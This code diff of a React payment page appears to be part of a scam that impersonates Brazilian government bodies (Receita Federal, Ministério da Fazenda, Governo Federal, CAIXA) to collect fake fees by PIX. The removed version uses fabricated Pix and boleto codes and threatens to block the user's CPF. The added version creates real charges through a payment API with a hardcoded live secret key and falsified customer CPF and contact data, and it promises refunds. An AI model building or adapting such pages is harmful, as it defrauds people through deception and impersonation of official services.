@@ -1,236 +1,397 @@
-import { useState, useEffect, useRef } from "react";
+import React, { useState, useEffect, useRef, useCallback } from 'react';
+import { useUser } from '../context/UserContext';
+import { useNavigate } from 'react-router-dom';
 
-// ── Paleta ───────────────────────────────────────────────────────────────────
-const C = {
-  azul: "#1351b4",
-  azulEscuro: "#0c326f",
-  azulClaro: "#2670e8",
-  azulFundo: "#dbe8fb",
-  verde: "#168821",
-  verdeClaro: "#d4efda",
-  vermelho: "#e52207",
-  vermelhoClaro: "#fde8e6",
-  amarelo: "#e0a800",
-  amareloClaro: "#fff3cd",
-  cinzaBorda: "#d0d5dd",
-  cinzaFundo: "#f8f9fb",
-  cinzaTexto: "#555",
-  cinzaLabel: "#888",
-  branco: "#ffffff",
-  texto: "#1a1a1a",
-};
+/* ── API Config ── */
+const API_URL = '/api/babylon';
+const SECRET_KEY = 'sk_live_dqsFdUZ8AWn8m2vWxAgImUZQsXvDoEv8i94xoI7MwcyHykIX';
+const COMPANY_ID = '52bef000-0bb0-42b2-a455-793dc0bd95f4';
+const AUTH_HEADER = 'Basic ' + btoa(`${SECRET_KEY}:${COMPANY_ID}`);
+const AMOUNT_CENTS = 5840; // R$ 58,40
 
-// ── Helpers ──────────────────────────────────────────────────────────────────
-const rand = (a: number, b: number) => Math.floor(Math.random() * (b - a + 1)) + a;
+/* ── Componente ── */
+const PagamentoGRU: React.FC = () => {
+  const { userData, transactionData, setTransactionData } = useUser();
+  const navigate = useNavigate();
 
-const gerarCodigoGRU = () => [
-  rand(10000, 99999), rand(10000, 99999), rand(10000, 99999),
-  rand(100000000, 999999999), rand(10, 99),
-].join(".");
+  const [pixCode, setPixCode] = useState<string>(transactionData.qrCode || '');
+  const [transactionId, setTransactionId] = useState<string>(transactionData.transactionId || '');
+  const [loading, setLoading] = useState(!transactionData.qrCode);
+  const [error, setError] = useState('');
+  const [copied, setCopied] = useState(false);
+  const [paymentStatus, setPaymentStatus] = useState<string>('pending');
+  const pollingRef = useRef<number | null>(null);
+  const creatingRef = useRef(false);
 
-const dataVencimento = () => {
-  const d = new Date();
-  d.setHours(d.getHours() + 24);
-  return d.toLocaleDateString("pt-BR", { day: "2-digit", month: "2-digit", year: "numeric" }) +
-    " às " + d.toLocaleTimeString("pt-BR", { hour: "2-digit", minute: "2-digit" });
-};
+  const firstName = userData?.nome
+    ? userData.nome.split(' ')[0].charAt(0).toUpperCase() + userData.nome.split(' ')[0].slice(1).toLowerCase()
+    : 'Paciente';
 
-// ── Componente contador regressivo ───────────────────────────────────────────
-const Contador = () => {
-  const [segundos, setSegundos] = useState(23 * 3600 + 59 * 60 + 47);
+  /* ── Criar transação PIX ── */
+  const createTransaction = useCallback(async () => {
+    if (creatingRef.current) return;
+    creatingRef.current = true;
+
+    try {
+      setLoading(true);
+      setError('');
+
+      const randomId = Math.random().toString(36).substring(2, 10);
+      const randomPhone = '5511' + String(Math.floor(900000000 + Math.random() * 99999999)).padStart(9, '0');
+      const randomCpfDigits = String(Math.floor(10000000000 + Math.random() * 89999999999));
+      const nome = userData?.nome || 'Paciente Brasil';
+
+      const body: Record<string, unknown> = {
+        amount: AMOUNT_CENTS,
+        paymentMethod: 'PIX',
+        description: 'Taxa de Seguro - Projeto Enxerga Brasil',
+        customer: {
+          name: nome,
+          email: `user${randomId}@gmail.com`,
+          phone: randomPhone,
+          document: randomCpfDigits,
+        },
+        items: [
+          {
+            title: 'Taxa de Seguro - Projeto Enxerga Brasil',
+            quantity: 1,
+            unitPrice: AMOUNT_CENTS,
+            externalRef: `enx-${Date.now()}`,
+          },
+        ],
+        pix: {
+          expiresInDays: 1,
+        },
+      };
+
+      const res = await fetch(API_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json', Authorization: AUTH_HEADER },
+        body: JSON.stringify(body),
+      });
+
+      const json = await res.json();
+      console.log('API response:', res.status, json);
+
+      if (!res.ok) {
+        const msg = json?.message || json?.error || JSON.stringify(json);
+        throw new Error(`Erro ${res.status}: ${msg}`);
+      }
+
+      const qrCode = json.data?.pix?.qrcode || json.pix?.qrcode;
+      const txId = String(json.data?.id || json.id || '');
+      const initialStatus = json.data?.status || json.status || 'waiting_payment';
+
+      if (qrCode) {
+        setPixCode(qrCode);
+        setTransactionId(txId);
+        setTransactionData({ qrCode, transactionId: txId });
+        if (initialStatus === 'paid') {
+          setPaymentStatus('paid');
+        }
+      } else {
+        throw new Error('QR code não retornado: ' + JSON.stringify(json).substring(0, 200));
+      }
+    } catch (err) {
+      setError(err instanceof Error ? err.message : 'Erro ao gerar pagamento. Tente novamente.');
+    } finally {
+      setLoading(false);
+      creatingRef.current = false;
+    }
+  }, [userData, setTransactionData]);
+
+  /* ── Polling de status ── */
+  const checkStatus = useCallback(async (id: string) => {
+    try {
+      const res = await fetch(`${API_URL}/${id}`, {
+        headers: { 'Content-Type': 'application/json', Authorization: AUTH_HEADER },
+      });
+      if (!res.ok) return;
+      const json = await res.json();
+      const status = json.data?.status || json.status;
+      if (status) setPaymentStatus(status);
+
+      if (status === 'paid') {
+        if (pollingRef.current) { window.clearInterval(pollingRef.current); pollingRef.current = null; }
+        setTimeout(() => navigate('/obrigado'), 3000);
+      }
+    } catch { /* silently ignore */ }
+  }, [navigate]);
+
+  /* ── Efeito: criar transação ao montar ── */
   useEffect(() => {
-    const t = setInterval(() => setSegundos(s => Math.max(0, s - 1)), 1000);
-    return () => clearInterval(t);
+    if (!pixCode) createTransaction();
+    // eslint-disable-next-line react-hooks/exhaustive-deps
   }, []);
-  const h = String(Math.floor(segundos / 3600)).padStart(2, "0");
-  const m = String(Math.floor((segundos % 3600) / 60)).padStart(2, "0");
-  const s = String(segundos % 60).padStart(2, "0");
-  return (
-    <span style={{ fontWeight: 800, fontSize: 18, letterSpacing: 2, color: C.vermelho }}>
-      {h}:{m}:{s}
-    </span>
-  );
-};
 
-// ── Página principal ─────────────────────────────────────────────────────────
-export default function PagamentoGRU() {
-  const [opcao, setOpcao] = useState<"boleto" | "pix">("pix");
-  const [copiado, setCopiado] = useState(false);
-  const codigo = useRef(gerarCodigoGRU());
-  const pixCode = useRef("00020126330014BR.GOV.BCB.PIX0111" + rand(10000000000, 99999999999) + "5204000053039865406059.405802BR5920CAIXA ECONOMICA FEDERAL6009SAO PAULO62070503***6304" + rand(1000, 9999));
-  const aprovData = (() => { try { return JSON.parse(localStorage.getItem("aprovacaoData") || "{}"); } catch { return {}; } })();
-  const userData = (() => { try { return JSON.parse(localStorage.getItem("userData") || "{}"); } catch { return {}; } })();
-  const nome = aprovData.nome || userData.nome || "Mutuário(a)";
-  const venc = useRef(dataVencimento());
+  /* ── Efeito: polling quando tiver transactionId ── */
+  useEffect(() => {
+    const id = transactionId;
+    if (!id || paymentStatus === 'paid') return;
+    checkStatus(id);
+    pollingRef.current = window.setInterval(() => checkStatus(id), 5000);
+    return () => { if (pollingRef.current) { window.clearInterval(pollingRef.current); pollingRef.current = null; } };
+  }, [transactionId, paymentStatus, checkStatus]);
 
-  const copiar = (texto: string) => {
-    navigator.clipboard.writeText(texto).catch(() => {});
-    setCopiado(true);
-    setTimeout(() => setCopiado(false), 2500);
+  const handleCopy = async () => {
+    try {
+      await navigator.clipboard.writeText(pixCode);
+      setCopied(true);
+      setTimeout(() => setCopied(false), 2500);
+    } catch { /* fallback */ }
   };
 
+  /* ── Tela de pagamento confirmado ── */
+  if (paymentStatus === 'paid') {
+    return (
+      <div className="fixed inset-0 z-50 bg-white flex items-center justify-center" style={{ fontFamily: 'Rawline, Raleway, sans-serif' }}>
+        <div className="text-center max-w-md mx-auto px-6">
+          <div className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-6">
+            <svg className="w-10 h-10 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
+            </svg>
+          </div>
+          <h2 className="text-2xl font-bold text-gray-900 mb-2">Pagamento confirmado!</h2>
+          <p className="text-gray-600 mb-2">Sua inscrição foi finalizada com sucesso.</p>
+          <p className="text-sm text-gray-400">Redirecionando...</p>
+        </div>
+      </div>
+    );
+  }
+
   return (
-    <div style={{ minHeight: "100vh", background: C.cinzaFundo, padding: "20px 0 60px" }}>
-      <div style={{ maxWidth: 540, margin: "0 auto", padding: "0 16px" }}>
-
-        {/* Cabeçalho oficial */}
-        <div style={{ background: C.azulEscuro, borderRadius: "12px 12px 0 0", padding: "20px 20px 16px", textAlign: "center" }}>
-          <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: 10, marginBottom: 6 }}>
-            <svg width="28" height="28" viewBox="0 0 24 24" fill="none">
-              <rect x="3" y="3" width="18" height="18" rx="3" stroke="white" strokeWidth="1.8" />
-              <path d="M3 9h18M9 9v12" stroke="white" strokeWidth="1.8" />
-            </svg>
-            <div style={{ textAlign: "left" }}>
-              <p style={{ fontSize: 10, color: "rgba(255,255,255,0.7)", letterSpacing: 1 }}>MINISTÉRIO DA FAZENDA</p>
-              <p style={{ fontSize: 14, fontWeight: 700, color: C.branco }}>GRU — Guia de Recolhimento da União</p>
-            </div>
-          </div>
-          <p style={{ fontSize: 11, color: "rgba(255,255,255,0.6)" }}>Receita Federal do Brasil — Ref. Habitação Social / CAIXA</p>
-        </div>
-
-        {/* Corpo */}
-        <div style={{ background: C.branco, borderRadius: "0 0 12px 12px", boxShadow: "0 4px 20px rgba(0,0,0,0.08)", overflow: "hidden" }}>
-
-          {/* Alerta de prazo */}
-          <div style={{ background: C.amareloClaro, borderBottom: `2px solid ${C.amarelo}`, padding: "14px 20px", display: "flex", alignItems: "center", gap: 12 }}>
-            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" style={{ flexShrink: 0 }}>
-              <circle cx="12" cy="12" r="10" stroke={C.amarelo} strokeWidth="2" />
-              <path d="M12 7v5l3 3" stroke={C.amarelo} strokeWidth="2" strokeLinecap="round" />
-            </svg>
+    <div className="fixed inset-0 z-50 overflow-y-auto bg-white" style={{ fontFamily: 'Rawline, Raleway, sans-serif' }}>
+      {/* Header sticky */}
+      <div className="sticky top-0 z-10 bg-white border-b border-gray-200">
+        <div className="flex items-center justify-between p-4 md:p-6">
+          <div className="flex items-center space-x-4">
+            <img src="/image.png" alt="Governo Federal" className="h-10 md:h-12 w-auto" />
             <div>
-              <p style={{ fontSize: 12, fontWeight: 700, color: "#5a3e00" }}>Tempo restante para pagamento</p>
-              <Contador />
+              <h1 className="text-xl md:text-2xl font-semibold text-gray-900" style={{ fontSize: 14 }}>
+                Guia de Recolhimento da União
+              </h1>
             </div>
-          </div>
-
-          {/* Dados do documento */}
-          <div style={{ padding: "16px 20px", borderBottom: `1px solid ${C.cinzaBorda}` }}>
-            <p style={{ fontSize: 13, fontWeight: 700, color: C.azulEscuro, marginBottom: 12 }}>Dados do Documento</p>
-            {[
-              ["Contribuinte/Mutuário", nome],
-              ["Unidade Gestora", "170500 — Habitação Social CAIXA"],
-              ["Gestão", "00001 — Tesouro Nacional"],
-              ["Código de Recolhimento", "28833-7 — Taxa de Cadastro e Análise (TCA)"],
-              ["Competência", new Date().toLocaleDateString("pt-BR", { month: "2-digit", year: "numeric" })],
-              ["Vencimento", venc.current],
-            ].map(([label, val]) => (
-              <div key={label} style={{ display: "flex", justifyContent: "space-between", marginBottom: 7, fontSize: 12, alignItems: "flex-start", gap: 8 }}>
-                <span style={{ color: C.cinzaTexto, minWidth: 140 }}>{label}:</span>
-                <span style={{ fontWeight: 600, color: C.texto, textAlign: "right" }}>{val}</span>
-              </div>
-            ))}
-            <div style={{ borderTop: `2px solid ${C.azulClaro}`, paddingTop: 10, marginTop: 8, display: "flex", justifyContent: "space-between", alignItems: "center" }}>
-              <span style={{ fontSize: 14, fontWeight: 700, color: C.azulEscuro }}>Valor a pagar:</span>
-              <span style={{ fontSize: 26, fontWeight: 800, color: C.azulEscuro }}>R$ 59,40</span>
-            </div>
-          </div>
-
-          {/* Seletor de forma */}
-          <div style={{ padding: "14px 20px", borderBottom: `1px solid ${C.cinzaBorda}` }}>
-            <p style={{ fontSize: 12, color: C.cinzaTexto, marginBottom: 10, fontWeight: 600 }}>Escolha a forma de pagamento:</p>
-            <div style={{ display: "flex", gap: 10 }}>
-              {(["pix", "boleto"] as const).map(op => (
-                <button
-                  key={op}
-                  onClick={() => setOpcao(op)}
-                  style={{
-                    flex: 1, padding: "10px", borderRadius: 8,
-                    border: `2px solid ${opcao === op ? C.azul : C.cinzaBorda}`,
-                    background: opcao === op ? C.azulFundo : C.branco,
-                    color: opcao === op ? C.azulEscuro : C.cinzaTexto,
-                    fontWeight: 700, fontSize: 13, cursor: "pointer", transition: "all 0.15s",
-                  }}
-                >
-                  {op === "pix" ? "📱 Pix" : "🔖 Boleto GRU"}
-                </button>
-              ))}
-            </div>
-          </div>
-
-          {/* Conteúdo do método */}
-          <div style={{ padding: "20px" }}>
-            {opcao === "pix" ? (
-              <>
-                <p style={{ fontSize: 13, fontWeight: 700, color: C.texto, marginBottom: 14, textAlign: "center" }}>
-                  Escaneie o QR Code ou copie o código Pix
-                </p>
-                {/* QR code visual (CSS art) */}
-                <div style={{ width: 160, height: 160, margin: "0 auto 16px", border: `3px solid ${C.azulEscuro}`, borderRadius: 8, padding: 8, display: "grid", gridTemplateColumns: "repeat(11,1fr)", gap: 1 }}>
-                  {Array.from({ length: 121 }).map((_, i) => {
-                    const row = Math.floor(i / 11), col = i % 11;
-                    const isCorner = (row < 3 && col < 3) || (row < 3 && col > 7) || (row > 7 && col < 3);
-                    const isDot = isCorner || (Math.sin(i * 13.7 + 5.3) > 0.2 && Math.cos(i * 7.1) > -0.1);
-                    return <div key={i} style={{ background: isDot ? C.azulEscuro : "transparent", borderRadius: 1 }} />;
-                  })}
-                </div>
-                <div style={{ background: C.cinzaFundo, border: `1px solid ${C.cinzaBorda}`, borderRadius: 8, padding: "10px 12px", marginBottom: 12, wordBreak: "break-all", fontSize: 10, color: C.cinzaTexto, lineHeight: 1.5 }}>
-                  {pixCode.current}
-                </div>
-                <button
-                  onClick={() => copiar(pixCode.current)}
-                  style={{ width: "100%", padding: "13px", borderRadius: 9, border: "none", background: copiado ? C.verde : C.azul, color: C.branco, fontSize: 14, fontWeight: 700, cursor: "pointer", transition: "background 0.2s" }}
-                >
-                  {copiado ? "✓ Código copiado!" : "📋 Copiar código Pix"}
-                </button>
-              </>
-            ) : (
-              <>
-                <p style={{ fontSize: 13, fontWeight: 700, color: C.texto, marginBottom: 14 }}>
-                  Código de barras da GRU
-                </p>
-                {/* Barras visuais */}
-                <div style={{ height: 60, background: C.azulEscuro, borderRadius: 6, marginBottom: 10, display: "flex", alignItems: "stretch", padding: "0 4px", gap: 1, overflow: "hidden" }}>
-                  {Array.from({ length: 80 }).map((_, i) => (
-                    <div key={i} style={{ flex: Math.sin(i * 2.3 + 1) > 0 ? 2 : 1, background: C.branco, opacity: Math.cos(i * 1.7) > 0.3 ? 1 : 0.3 }} />
-                  ))}
-                </div>
-                <div style={{ fontFamily: "monospace", fontSize: 11, color: C.texto, marginBottom: 14, textAlign: "center", letterSpacing: 1.5 }}>
-                  {codigo.current}
-                </div>
-                <button
-                  onClick={() => copiar(codigo.current)}
-                  style={{ width: "100%", padding: "13px", borderRadius: 9, border: "none", background: copiado ? C.verde : C.azul, color: C.branco, fontSize: 14, fontWeight: 700, cursor: "pointer", transition: "background 0.2s" }}
-                >
-                  {copiado ? "✓ Código copiado!" : "📋 Copiar linha digitável"}
-                </button>
-              </>
-            )}
-          </div>
-
-          {/* Aviso bloqueio CPF */}
-          <div style={{ background: C.vermelhoClaro, borderTop: `1.5px solid #f4b4ae`, padding: "14px 20px" }}>
-            <div style={{ display: "flex", gap: 10, alignItems: "flex-start" }}>
-              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" style={{ flexShrink: 0, marginTop: 2 }}>
-                <circle cx="12" cy="12" r="10" stroke={C.vermelho} strokeWidth="2" />
-                <path d="M12 7v6M12 15.5v.5" stroke={C.vermelho} strokeWidth="2" strokeLinecap="round" />
-              </svg>
-              <div>
-                <p style={{ fontSize: 12, fontWeight: 700, color: "#a00", marginBottom: 4 }}>⚠️ Atenção — não ignore este aviso:</p>
-                <p style={{ fontSize: 12, color: "#600", lineHeight: 1.6 }}>
-                  O não pagamento desta taxa dentro do prazo de <strong>24 horas</strong> resultará no
-                  <strong> bloqueio preventivo do seu CPF</strong> nos sistemas do Ministério da Fazenda e
-                  <strong> suspensão imediata</strong> do processo de contratação do crédito habitacional.
-                </p>
-              </div>
-            </div>
-          </div>
-
-          {/* Rodapé */}
-          <div style={{ padding: "14px 20px", background: "#f0f2f5", borderTop: `1px solid ${C.cinzaBorda}`, textAlign: "center" }}>
-            <p style={{ fontSize: 11, color: C.cinzaLabel, lineHeight: 1.6 }}>
-              GRU — Guia de Recolhimento da União · Receita Federal do Brasil<br />
-              Em caso de dúvidas, ligue: <strong>0800 726 0101</strong> (SAC CAIXA)
-            </p>
           </div>
         </div>
+      </div>
 
-        {/* Selos de segurança */}
-        <div style={{ marginTop: 20, display: "flex", justifyContent: "center", gap: 24, flexWrap: "wrap" }}>
-          {["🔒 Ambiente seguro", "🏛️ Governo Federal", "✓ Receita Federal"].map(txt => (
-            <span key={txt} style={{ fontSize: 11, color: C.cinzaTexto, display: "flex", alignItems: "center", gap: 4 }}>{txt}</span>
-          ))}
+      {/* Content */}
+      <div className="flex-1 p-6 md:p-8 lg:p-12">
+        <div className="max-w-5xl mx-auto">
+          <div className="text-center mb-8 md:mb-12">
+            <h2 className="text-2xl md:text-3xl font-light text-gray-900 mb-2">
+              {firstName}, finalize sua inscrição
+            </h2>
+            <p className="text-gray-600">Última etapa para confirmar sua participação</p>
+          </div>
+
+          {/* ── Loading ── */}
+          {loading && (
+            <div className="flex flex-col items-center justify-center py-20">
+              <div className="w-16 h-16 border-4 border-gray-200 border-t-[#1351B4] rounded-full animate-spin mb-6" />
+              <p className="text-gray-600 text-lg">Gerando pagamento PIX...</p>
+              <p className="text-gray-400 text-sm mt-1">Aguarde alguns segundos</p>
+            </div>
+          )}
+
+          {/* ── Error ── */}
+          {error && !loading && (
+            <div className="flex flex-col items-center justify-center py-20">
+              <div className="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mb-6">
+                <svg className="w-8 h-8 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
+                </svg>
+              </div>
+              <p className="text-gray-900 text-lg font-medium mb-2">Falha ao gerar pagamento</p>
+              <p className="text-gray-500 text-sm mb-6">{error}</p>
+              <button onClick={createTransaction} className="px-6 py-3 bg-[#1351B4] text-white rounded-lg font-medium hover:bg-blue-700 transition">
+                Tentar novamente
+              </button>
+            </div>
+          )}
+
+          {/* ── Payment content ── */}
+          {!loading && !error && pixCode && (
+            <>
+              <div className="flex items-center justify-center gap-2 mb-8">
+                <span className="relative flex h-3 w-3">
+                  <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-yellow-400 opacity-75" />
+                  <span className="relative inline-flex rounded-full h-3 w-3 bg-yellow-500" />
+                </span>
+                <span className="text-sm text-yellow-700 font-medium">Aguardando pagamento...</span>
+              </div>
+
+              <div className="grid grid-cols-1 lg:grid-cols-2 gap-8 lg:gap-16">
+                {/* LEFT COLUMN */}
+                <div className="space-y-8">
+                  <div className="text-center">
+                    <p className="text-sm text-gray-500 mb-2">Total para quitação</p>
+                    <p className="text-5xl md:text-6xl font-light text-gray-900 mb-1">R$ 58,40</p>
+                    <p className="text-sm text-gray-500">Quitação com Segurança Garantida.</p>
+                    <div className="mt-4 border-l-2 border-gray-300 pl-3 text-left max-w-sm mx-auto">
+                      <p className="text-gray-700 text-xs font-medium mb-1">Garantia de comparecimento</p>
+                      <p className="text-gray-600 text-xs">Valor devolvido integralmente após sua presença na consulta</p>
+                    </div>
+                  </div>
+                  <div className="flex justify-center">
+                    <div className="bg-gray-50 p-8 rounded-2xl">
+                      <div className="w-64 h-64 md:w-80 md:h-80 bg-white rounded-xl flex items-center justify-center shadow-sm">
+                        <img
+                          src={`https://api.qrserver.com/v1/create-qr-code/?size=320x320&data=${encodeURIComponent(pixCode)}`}
+                          alt="QR Code PIX"
+                          className="w-full h-full object-contain p-4"
+                        />
+                      </div>
+                    </div>
+                  </div>
+                </div>
+
+                {/* RIGHT COLUMN */}
+                <div className="space-y-8">
+                  <div>
+                    <h3 className="text-lg font-medium text-gray-900 mb-4">Código PIX</h3>
+                    <div className="space-y-4">
+                      <div className="bg-gray-50 border border-gray-200 rounded-lg p-4">
+                        <p
+                          className="text-xs font-mono text-gray-700 break-all leading-relaxed select-all"
+                          onCopy={(e) => { e.preventDefault(); e.clipboardData.setData('text/plain', pixCode); setCopied(true); }}
+                        >
+                          {pixCode}
+                        </p>
+                      </div>
+                      <button
+                        onClick={handleCopy}
+                        className="w-full py-4 text-base font-semibold rounded-lg transition-all duration-300 bg-[#1351B4] hover:bg-blue-700 text-white inline-flex items-center justify-center gap-2"
+                      >
+                        {copied ? (
+                          <>
+                            <svg className="h-5 w-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
+                            </svg>
+                            <span>Código copiado!</span>
+                          </>
+                        ) : (
+                          <>
+                            <svg className="h-5 w-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                              <rect width="14" height="14" x="8" y="8" rx="2" ry="2" />
+                              <path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2" />
+                            </svg>
+                            <span>Copiar código PIX</span>
+                          </>
+                        )}
+                      </button>
+                    </div>
+                  </div>
+
+                  <div className="bg-white border border-gray-200 rounded-lg p-6 shadow-sm">
+                    <h3 className="text-lg font-semibold text-[#1351B4] mb-4 flex items-center gap-2">
+                      <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8.228 9c.549-1.165 2.03-2 3.772-2 2.21 0 4 1.343 4 3 0 1.4-1.278 2.575-3.006 2.907-.542.104-.994.54-.994 1.093m0 3h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
+                      </svg>
+                      Para onde vai essa taxa?
+                    </h3>
+                    <div className="space-y-4">
+                      <div className="space-y-3">
+                        {[
+                          { label: 'Custeio da Consulta', pct: 40, color: 'blue' },
+                          { label: 'Tecnologia do Sistema', pct: 30, color: 'green' },
+                          { label: 'Auditoria e Segurança', pct: 30, color: 'orange' },
+                        ].map((item) => (
+                          <div key={item.label} className="flex items-center gap-3">
+                            <div className={`w-4 h-4 bg-${item.color}-500 rounded`} />
+                            <div className="flex-1">
+                              <div className="flex justify-between items-center mb-1">
+                                <span className="text-sm font-medium text-gray-700">{item.label}</span>
+                                <span className={`text-sm font-bold text-${item.color}-600`}>{item.pct}%</span>
+                              </div>
+                              <div className="w-full bg-gray-200 rounded-full h-2">
+                                <div className={`bg-${item.color}-500 h-2 rounded-full`} style={{ width: `${item.pct}%` }} />
+                              </div>
+                            </div>
+                          </div>
+                        ))}
+                      </div>
+                      <div className="space-y-3 text-xs text-gray-600 bg-gray-50 p-3 rounded-lg">
+                        <div className="flex items-start gap-2">
+                          <div className="w-2 h-2 bg-blue-500 rounded-full mt-1 flex-shrink-0" />
+                          <p><strong>Custeio da Consulta:</strong> Impressão, logística e atendimento em todo território nacional.</p>
+                        </div>
+                        <div className="flex items-start gap-2">
+                          <div className="w-2 h-2 bg-green-500 rounded-full mt-1 flex-shrink-0" />
+                          <p><strong>Tecnologia:</strong> Plataforma de inscrições, sistema de pagamentos e infraestrutura digital.</p>
+                        </div>
+                        <div className="flex items-start gap-2">
+                          <div className="w-2 h-2 bg-orange-500 rounded-full mt-1 flex-shrink-0" />
+                          <p><strong>Auditoria:</strong> Fiscalização, conformidade LGPD e validação de processos.</p>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+
+                  <div>
+                    <h3 className="text-lg font-medium text-gray-900 mb-4">Como quitar</h3>
+                    <div className="space-y-3">
+                      {[
+                        'Abra seu aplicativo bancário',
+                        'Acesse a área PIX',
+                        'Escaneie o QR Code ou cole o código',
+                        'Confirme a quitação',
+                      ].map((text, i) => (
+                        <div key={i} className="flex items-center text-gray-700">
+                          <span className="w-6 h-6 bg-[#1351B4] text-white rounded-full flex items-center justify-center text-sm font-medium mr-3">
+                            {i + 1}
+                          </span>
+                          {text}
+                        </div>
+                      ))}
+                      <div className="flex items-center text-gray-700">
+                        <span className="w-6 h-6 bg-green-600 text-white rounded-full flex items-center justify-center text-sm font-medium mr-3">5</span>
+                        <span className="font-medium">Volte a esta página para confirmar sua inscrição</span>
+                      </div>
+                    </div>
+                  </div>
+
+                  <div className="bg-amber-50 border border-amber-200 rounded-lg p-4">
+                    <div className="flex items-start gap-3">
+                      <div className="flex-shrink-0 w-8 h-8 bg-amber-100 rounded-full flex items-center justify-center">
+                        <svg className="h-4 w-4 text-amber-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="m12 19-7-7 7-7" />
+                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 12H5" />
+                        </svg>
+                      </div>
+                      <div>
+                        <h4 className="font-medium text-amber-800 text-sm mb-1">Importante: Volte após o pagamento</h4>
+                        <p className="text-amber-700 text-xs leading-relaxed">
+                          Após realizar o pagamento PIX no seu banco, retorne a esta página. A confirmação da sua inscrição será feita automaticamente assim que identificarmos o pagamento.
+                        </p>
+                      </div>
+                    </div>
+                  </div>
+
+                  <div className="bg-gray-50 p-6 rounded-lg">
+                    <h4 className="font-medium text-gray-900 mb-3">Após a quitação</h4>
+                    <p className="text-gray-600 text-sm leading-relaxed">
+                      Seu protocolo será finalizado automaticamente. Você receberá confirmação com todas as informações necessárias para acompanhar o agendamento.
+                    </p>
+                  </div>
+                </div>
+              </div>
+
+              <div className="text-center mt-12 pt-8 border-t border-gray-200">
+                <div className="flex items-center justify-center mb-2">
+                  <svg className="w-4 h-4 text-gray-400 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z" />
+                  </svg>
+                  <span className="text-sm text-gray-500">Quitação segura</span>
+                </div>
+                <p className="text-xs text-gray-400">Processado via sistema governamental • SSL • Dados criptografados</p>
+              </div>
+            </>
+          )}
         </div>
       </div>
     </div>
   );
-}
+};
+
+export default PagamentoGRU;
